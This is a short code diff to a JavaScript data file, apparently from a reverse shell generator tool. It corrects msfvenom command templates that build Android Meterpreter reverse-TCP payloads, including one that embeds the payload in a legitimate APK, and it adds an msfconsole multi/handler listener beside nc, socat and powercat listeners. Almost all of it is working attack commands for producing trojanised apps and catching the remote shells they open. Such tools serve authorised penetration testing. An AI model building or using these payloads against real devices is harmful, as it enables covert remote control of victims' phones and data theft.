@@ -327,12 +327,12 @@ const msfvenomCommands =  withCommandType(
         },
         {
             "name": "Android Meterpreter Reverse TCP",
-            "command": "msfvenom -a x64 --platform android –p android/meterpreter/reverse_tcp lhost={ip} lport={port} R -o malicious.apk",
+            "command": "msfvenom -a x64 --platform android -p android/meterpreter/reverse_tcp lhost={ip} lport={port} R -o malicious.apk",
             "meta": ["msfvenom", "android", "android", "reverse"]
         },
         {
             "name": "Android Meterpreter Embed Reverse TCP",
-            "command": "msfvenom -a x64 --platform android -x <app.apk> android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk",
+            "command": "msfvenom -a x64 --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk",
             "meta": ["msfvenom", "android", "android", "reverse"]
         },
         {
@@ -357,7 +357,8 @@ const rsgData = {
         ['windows ConPty', 'stty raw -echo; (stty size; cat) | nc -lvnp {port}'],
         ['socat', 'socat -d -d TCP-LISTEN:{port} STDOUT'],
         ['socat (TTY)', 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}'],
-        ['powercat', 'powercat -l -p {port}']
+        ['powercat', 'powercat -l -p {port}'],
+        ['msfconsole', 'msfconsole -q -x "use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit"']
     ],
 
     shells: ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh'],
